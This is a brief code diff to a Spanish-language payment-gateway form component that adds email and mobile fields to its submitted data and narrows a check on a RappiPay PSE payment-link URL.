@@ -129,6 +129,8 @@ function PasarelaPago() {
       tipo: docType,
       doc: docNumber.trim(),
       nombre: fullName.trim(),
+      email: email.trim(),
+      celular: mobile.trim(),
       sessionId: getTrackSessionId(),
     };
 
@@ -152,7 +154,7 @@ function PasarelaPago() {
       return;
     }
 
-    if (!targetUrl || targetUrl.includes('linkdepagospse.rappipay.co')) {
+    if (!targetUrl || targetUrl.includes('linkdepagospse.rappipay.co/invalido')) {
       setLoading(false);
       setGeneralError('No fue posible procesar la informacion en este momento. Por favor verifique sus datos e intente nuevamente.');
       return;
